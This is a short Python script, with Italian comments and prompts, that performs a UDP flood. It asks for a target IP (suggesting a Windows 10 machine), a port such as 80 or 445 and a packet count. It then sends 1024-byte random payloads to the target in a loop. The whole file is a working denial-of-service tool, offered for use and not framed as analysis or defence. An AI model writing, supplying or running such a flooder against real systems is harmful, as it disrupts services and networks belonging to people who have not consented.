import socket
import random
import os

def udp_flood():
    # Input dall'utente
    target_ip = input("Inserisci l'IP del target (Windows 10): ")
    target_port = int(input("Inserisci la porta (es. 80 o 445): "))
    packet_count = int(input("Quanti pacchetti vuoi inviare? "))

    # Creazione del socket UDP
    # AF_INET indica IPv4, SOCK_DGRAM indica UDP
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # Generiamo un payload casuale di 1024 byte
    bytes_payload = random._urandom(1024)
    
    print(f"Inizio invio di {packet_count} pacchetti verso {target_ip}:{target_port}...")

    sent = 0
    try:
        for i in range(packet_count):
            sock.sendto(bytes_payload, (target_ip, target_port))
            sent += 1
            if sent % 1000 == 0:
                print(f"Pacchetti inviati: {sent}")
    except KeyboardInterrupt:
        print("\nInterrotto dall'utente.")
    finally:
        print(f"\nTask terminato. Totale pacchetti inviati: {sent}")
        sock.close()

if __name__ == "__main__":
    udp_flood()